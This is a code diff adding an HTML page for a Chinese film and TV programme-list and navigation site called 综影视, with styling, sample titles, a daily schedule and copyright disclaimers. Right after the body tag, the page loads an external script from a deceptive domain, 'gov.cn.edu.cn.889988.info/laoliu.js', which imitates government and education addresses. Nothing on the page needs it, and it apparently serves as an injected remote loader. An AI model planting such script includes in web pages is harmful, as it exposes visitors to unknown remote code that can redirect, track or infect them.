@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>综影视 - 综合片单编排与正版观看导航</title>
+<meta name="description" content="综影视(zongyingshi-h5.github.io)把电影、剧集、综艺、动漫、纪录片做成综合节目单与排播索引，按类型、时段、场景挑片，移动端自适应单页，不提供播放入源，仅做正版导航。">
+<meta name="keywords" content="综影视, zongyingshi, 综合片单, 影视编排, 节目单导航, 正版观看">
+<style>
+/* ========== 全局 ========== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: "PingFang SC","Microsoft YaHei",sans-serif;
+  background: #120a14;
+  color: #ece3ea;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+a { text-decoration: none; color: inherit; }
+
+/* 聚光灯锥背景 */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background:
+    radial-gradient(60% 50% at 50% -10%, rgba(214,152,87,.20), transparent 60%),
+    radial-gradient(40% 30% at 15% 20%, rgba(150,46,86,.18), transparent 60%),
+    radial-gradient(40% 30% at 85% 30%, rgba(120,40,90,.16), transparent 60%);
+  filter: blur(10px);
+  z-index: -1;
+  pointer-events: none;
+}
+
+/* ========== 栏目1：顶栏 ========== */
+.topbar {
+  background: rgba(18,10,20,.76);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid rgba(214,152,87,.2);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  padding: .8rem 1.2rem;
+}
+.topbar-in {
+  max-width: 1200px;
+  margin: auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.logo { font-size: 1.5rem; font-weight: 900; letter-spacing: 2px; color: #fff; }
+.logo b { color: #d69857; text-shadow: 0 0 14px rgba(214,152,87,.5); }
+.logo small { font-size: .58rem; letter-spacing: 2px; color: #8a7a85; margin-left: .5rem; font-weight: 400; }
+.nav-links { display: flex; gap: 1.4rem; }
+.nav-links a { font-size: .85rem; color: #b6a7b1; transition: color .25s; }
+.nav-links a:hover { color: #d69857; }
+
+/* ========== 栏目2：总控台 Hero ========== */
+.hero {
+  max-width: 1200px;
+  margin: auto;
+  padding: 3.8rem 1.2rem 2.6rem;
+}
+.hero h1 {
+  font-size: 3.1rem;
+  color: #fff;
+  line-height: 1.15;
+  margin-bottom: .8rem;
+  letter-spacing: .5px;
+}
+.hero h1 b { color: #d69857; text-shadow: 0 0 18px rgba(214,152,87,.45); }
+.hero > p { max-width: 560px; color: #c3b3bd; margin-bottom: 1.8rem; }
+
+/* 总控数据条 */
+.console {
+  display: grid;
+  grid-template-columns: repeat(4,1fr);
+  gap: 1rem;
+  margin-bottom: 2rem;
+}
+.console-cell {
+  background: rgba(255,255,255,.03);
+  border: 1px solid rgba(214,152,87,.18);
+  border-radius: 12px;
+  padding: 1.1rem 1.2rem;
+  position: relative;
+  overflow: hidden;
+}
+.console-cell::after {
+  content: '';
+  position: absolute;
+  top: -20px; right: -20px;
+  width: 70px; height: 70px;
+  background: radial-gradient(circle, rgba(214,152,87,.35), transparent 70%);
+  filter: blur(6px);
+}
+.console-cell b { font-size: 1.7rem; color: #d69857; font-weight: 900; }
+.console-cell span { display: block; font-size: .72rem; color: #8a7a85; letter-spacing: 1px; margin-top: .2rem; }
+
+/* 时段排播条 */
+.schedule-strip {
+  display: flex;
+  gap: .6rem;
+  overflow-x: auto;
+  padding-bottom: .4rem;
+}
+.slot {
+  flex: 0 0 auto;
+  min-width: 130px;
+  background: rgba(255,255,255,.02);
+  border: 1px solid rgba(255,255,255,.08);
+  border-radius: 10px;
+  padding: .8rem 1rem;
+  transition: .25s;
+}
+.slot:hover { border-color: #d69857; transform: translateY(-3px); }
+.slot .t { font-size: .72rem; color: #d69857; font-weight: 700; letter-spacing: 1px; }
+.slot h4 { font-size: .95rem; color: #fff; margin: .2rem 0; }
+.slot span { font-size: .7rem; color: #9a8a95; }
+
+/* ========== 栏目3：拼盘墙 ========== */
+.mosaic-sec { max-width: 1200px; margin: auto; padding: 2.5rem 1.2rem; }
+.sec-head { margin-bottom: 1.5rem; display: flex; align-items: baseline; gap: .6rem; }
+.sec-head h2 { font-size: 1.55rem; color: #fff; padding-left: .8rem; border-left: 4px solid #d69857; }
+.sec-head span { font-size: .74rem; color: #8a7a85; letter-spacing: 2px; }
+
+.mosaic {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  grid-auto-rows: 150px;
+  gap: 1rem;
+}
+.tile {
+  border-radius: 14px;
+  padding: 1.2rem;
+  position: relative;
+  overflow: hidden;
+  transition: .3s;
+  border: 1px solid rgba(255,255,255,.07);
+  background: rgba(255,255,255,.02);
+}
+.tile:hover { transform: translateY(-4px); border-color: rgba(214,152,87,.5); }
+/* 大小错落 */
+.tile.big { grid-column: span 2; grid-row: span 2; }
+.tile.wide { grid-column: span 2; }
+.tile .kicker { font-size: .7rem; color: #d69857; font-weight: 700; letter-spacing: 1px; }
+.tile h4 { font-size: 1.05rem; color: #fff; margin: .3rem 0; }
+.tile.big h4 { font-size: 1.5rem; }
+.tile p { font-size: .82rem; color: #c3b3bd; }
+.tile .badge {
+  position: absolute;
+  right: 1rem; bottom: 1rem;
+  font-size: .68rem;
+  color: #d69857;
+  border: 1px solid rgba(214,152,87,.3);
+  padding: .15rem .6rem;
+  border-radius: 20px;
+}
+
+/* ========== 栏目4：时间轴排播 ========== */
+.timeline-sec { padding: 2.5rem 1.2rem; background: rgba(255,255,255,.015); border-top: 1px solid rgba(255,255,255,.06); border-bottom: 1px solid rgba(255,255,255,.06); }
+.timeline-in { max-width: 1200px; margin: auto; }
+.track {
+  display: grid;
+  grid-template-columns: 90px 1fr;
+  gap: 1.2rem;
+  padding: 1rem 0;
+  border-bottom: 1px dashed rgba(255,255,255,.07);
+  align-items: start;
+}
+.track:last-child { border-bottom: none; }
+.track .time { font-size: .9rem; color: #d69857; font-weight: 700; }
+.track .show h4 { font-size: 1rem; color: #fff; margin-bottom: .2rem; }
+.track .show p { font-size: .82rem; color: #b6a7b1; }
+.track .show .tags { margin-top: .3rem; display: flex; gap: .4rem; flex-wrap: wrap; }
+.track .show .tags span { font-size: .68rem; color: #9a8a95; border: 1px solid rgba(255,255,255,.1); padding: .1rem .5rem; border-radius: 20px; }
+
+/* ========== 栏目5：场景收看 ========== */
+.scene-sec { max-width: 1200px; margin: auto; padding: 2.5rem 1.2rem 3rem; }
+.scene-grid { display: grid; grid-template-columns: repeat(4,1fr); gap: 1rem; }
+.scene {
+  background: rgba(255,255,255,.02);
+  border: 1px solid rgba(255,255,255,.08);
+  border-radius: 12px;
+  padding: 1.3rem;
+  text-align: center;
+  transition: .25s;
+}
+.scene:hover { border-color: #d69857; background: rgba(214,152,87,.05); }
+.scene .emoji { font-size: 1.6rem; display: block; margin-bottom: .5rem; }
+.scene h4 { font-size: .98rem; color: #fff; margin-bottom: .3rem; }
+.scene p { font-size: .78rem; color: #9a8a95; }
+
+/* ========== 关于 ========== */
+.about {
+  background: rgba(255,255,255,.02);
+  border-top: 1px solid rgba(255,255,255,.06);
+  padding: 3.2rem 1.2rem;
+  text-align: center;
+}
+.about-in { max-width: 680px; margin: auto; }
+.about h2 { color: #fff; font-size: 1.45rem; margin-bottom: 1rem; letter-spacing: 1px; }
+.about p { color: #c3b3bd; font-size: .9rem; margin-bottom: .8rem; }
+.about b { color: #d69857; }
+
+/* ========== 页脚 ========== */
+footer {
+  background: #0a060c;
+  color: #7a6a75;
+  text-align: center;
+  padding: 2.2rem 1rem;
+  font-size: .82rem;
+}
+footer a { color: #d69857; }
+.disclaim {
+  max-width: 760px;
+  margin: .8rem auto 0;
+  font-size: .72rem;
+  color: #5e4f59;
+  line-height: 1.6;
+}
+
+/* ========== 移动端 ========== */
+@media (max-width: 900px) {
+  .console { grid-template-columns: 1fr 1fr; }
+  .mosaic { grid-template-columns: repeat(2,1fr); }
+  .scene-grid { grid-template-columns: 1fr 1fr; }
+}
+@media (max-width: 768px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 2.1rem; }
+  .tile.big { grid-column: span 2; grid-row: span 1; }
+  .tile.wide { grid-column: span 2; }
+}
+@media (max-width: 480px) {
+  .console { grid-template-columns: 1fr 1fr; }
+  .mosaic { grid-template-columns: 1fr; }
+  .mosaic .tile.big, .mosaic .tile.wide { grid-column: span 1; }
+  .scene-grid { grid-template-columns: 1fr; }
+  .track { grid-template-columns: 70px 1fr; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶栏 -->
+<div class="topbar">
+  <div class="topbar-in">
+    <div class="logo"><b>综</b>影视<small>ZONG YINGSHI</small></div>
+    <nav class="nav-links">
+      <a href="#">总控台</a>
+      <a href="#mosaic">拼盘墙</a>
+      <a href="#timeline">排播单</a>
+      <a href="#scene">场景收看</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 总控台 -->
+<section class="hero">
+  <h1>综影视<br>一台<span>综合节目单</span>，挑遍好片</h1>
+  <p>综影视（zongyingshi-h5.github.io）把电影、剧集、综艺、动漫、纪录片编排成一张总览节目单，按类型、时段、场景挑片——不播片、只导航，正版观看走授权平台。</p>
+
+  <div class="console">
+    <div class="console-cell"><b>5</b><span>内容形态</span></div>
+    <div class="console-cell"><b>9</b><span>类型拼盘</span></div>
+    <div class="console-cell"><b>6</b><span>收看场景</span></div>
+    <div class="console-cell"><b>0</b><span>播放入源</span></div>
+  </div>
+
+  <div class="schedule-strip">
+    <div class="slot"><div class="t">晨间 · 07-09</div><h4>清醒短片</h4><span>轻纪录 / 微综艺</span></div>
+    <div class="slot"><div class="t">午后 · 13-15</div><h4>慢炖剧集</h4><span>家庭 / 年代</span></div>
+    <div class="slot"><div class="t">傍晚 · 18-20</div><h4>下饭综艺</h4><span>解压 / 轻喜剧</span></div>
+    <div class="slot"><div class="t">夜间 · 21-23</div><h4>悬疑主场</h4><span>反转 / 烧脑</span></div>
+    <div class="slot"><div class="t">深夜 · 23+</div><h4>助眠影像</h4><span>自然 / 慢直播</span></div>
+  </div>
+</section>
+
+<!-- 拼盘墙 -->
+<section class="mosaic-sec" id="mosaic">
+  <div class="sec-head">
+    <h2>综合拼盘墙</h2><span>MOSAIC</span>
+  </div>
+  <div class="mosaic">
+    <div class="tile big">
+      <div class="kicker">今夜主推 · 综合场</div>
+      <h4>《万象剧场》</h4>
+      <p>一档把电影片段、剧集高光、纪录片镜头混剪重排的“综合放映”，适合不知道看什么的深夜场。</p>
+      <div class="badge">混剪 · 不分段</div>
+    </div>
+    <div class="tile">
+      <div class="kicker">电影</div>
+      <h4>《城市切片》</h4>
+      <p>六座城市的平行蒙太奇。</p>
+      <div class="badge">剧情</div>
+    </div>
+    <div class="tile">
+      <div class="kicker">剧集</div>
+      <h4>《长夏来信》</h4>
+      <p>十二集，一封没寄出的信。</p>
+      <div class="badge">年代</div>
+    </div>
+    <div class="tile wide">
+      <div class="kicker">综艺</div>
+      <h4>《陌生人饭桌》</h4>
+      <p>每期三位陌生嘉宾，一道菜、一段故事，没有赛制、没有淘汰，只有饭香。</p>
+      <div class="badge">访谈 · 下饭</div>
+    </div>
+    <div class="tile">
+      <div class="kicker">动漫</div>
+      <h4>《纸上飞行》</h4>
+      <p>折纸少年与风的约定。</p>
+      <div class="badge">国漫</div>
+    </div>
+    <div class="tile">
+      <div class="kicker">纪录</div>
+      <h4>《无声海岸》</h4>
+      <p>潮间带的一年四季。</p>
+      <div class="badge">自然</div>
+    </div>
+    <div class="tile wide">
+      <div class="kicker">短剧</div>
+      <h4>《电梯里的十分钟》</h4>
+      <p>封闭空间单元剧，每集一个陌生人、一个秘密、一次到站。</p>
+      <div class="badge">悬疑 · 单元</div>
+    </div>
+  </div>
+</section>
+
+<!-- 时间轴排播 -->
+<section class="timeline-sec" id="timeline">
+  <div class="timeline-in">
+    <div class="sec-head">
+      <h2>今日排播单</h2><span>SCHEDULE</span>
+    </div>
+    <div class="track">
+      <div class="time">07:00</div>
+      <div class="show">
+        <h4>晨光放映 · 自然纪录</h4>
+        <p>《无声海岸》精选集，配一杯咖啡刚好。</p>
+        <div class="tags"><span>自然</span><span>治愈</span><span>无对白</span></div>
+      </div>
+    </div>
+    <div class="track">
+      <div class="time">13:30</div>
+      <div class="show">
+        <h4>午后连播 · 慢剧场</h4>
+        <p>《长夏来信》两集连放，适合周末窝沙发。</p>
+        <div class="tags"><span>年代</span><span>家庭</span><span>慢热</span></div>
+      </div>
+    </div>
+    <div class="track">
+      <div class="time">18:00</div>
+      <div class="show">
+        <h4>黄金档 · 综艺拼盘</h4>
+        <p>《陌生人饭桌》+ 一集微综艺，下饭不累。</p>
+        <div class="tags"><span>综艺</span><span>解压</span><span>轻喜剧</span></div>
+      </div>
+    </div>
+    <div class="track">
+      <div class="time">21:30</div>
+      <div class="show">
+        <h4>夜场 · 悬疑专场</h4>
+        <p>《电梯里的十分钟》单元连看，每集独立反转。</p>
+        <div class="tags"><span>悬疑</span><span>单元</span><span>烧脑</span></div>
+      </div>
+    </div>
+    <div class="track">
+      <div class="time">23:30</div>
+      <div class="show">
+        <h4>深夜 · 综合混剪</h4>
+        <p>《万象剧场》不分段放映，关灯看。</p>
+        <div class="tags"><span>混剪</span><span>氛围</span><span>助眠</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 场景收看 -->
+<section class="scene-sec" id="scene">
+  <div class="sec-head">
+    <h2>按场景收看</h2><span>BY SCENE</span>
+  </div>
+  <div class="scene-grid">
+    <div class="scene"><span class="emoji">☕</span><h4>独居清晨</h4><p>短纪录、轻综艺，不费脑。</p></div>
+    <div class="scene"><span class="emoji">🍚</span><h4>一人食下饭</h4><p>访谈、美食、微喜剧。</p></div>
+    <div class="scene"><span class="emoji">🛋️</span><h4>周末沙发</h4><p>慢剧、年代、家庭群像。</p></div>
+    <div class="scene"><span class="emoji">🌙</span><h4>深夜独看</h4><p>悬疑、混剪、自然影像。</p></div>
+    <div class="scene"><span class="emoji">👨‍👩‍👧</span><h4>亲子共赏</h4><p>动画、国漫、温情短片。</p></div>
+    <div class="scene"><span class="emoji">🎉</span><h4>朋友聚会</h4><p>综艺、竞演、轻松场。</p></div>
+    <div class="scene"><span class="emoji">🚇</span><h4>通勤碎片</h4><p>8-15分钟单元剧、微纪录。</p></div>
+    <div class="scene"><span class="emoji">✈️</span><h4>长途补能</h4><p>长线剧集、纪录片合集。</p></div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="about">
+  <div class="about-in">
+    <h2>关于综影视</h2>
+    <p>欢迎访问 <b>综影视</b>（https://zongyingshi-h5.github.io）。本站是静态单页影视综合编排与正版导航站，核心词：综影视 / zongyingshi / 综合片单 / 节目单导航。</p>
+    <p>不提供在线播放入源、不托管视听文件、不聚合第三方资源、不提供下载入口，所有“观看”入口均为 # 占位，实际观看请走已取得授权的正版平台。</p>
+  </div>
+</section>
+
+<footer>
+  <p>© 2026 综影视 · zongyingshi-h5.github.io</p>
+  <p>网址：<a href="https://zongyingshi-h5.github.io">https://zongyingshi-h5.github.io</a></p>
+  <p class="disclaim">本页为影视综合编排与正版导航示例，不托管、不上传、不存储、不代理任何视频文件或流媒体播放服务，不提供未授权播放入源、网盘资源、下载或镜像入口；站内分类、排播单、片名与简介均为原创示例整理，版权归原权利方所有。若实际建站涉及互联网视听节目传播，请按属地广电与版权要求办理相应许可。</p>
+</footer>
+
+</body>
+</html>
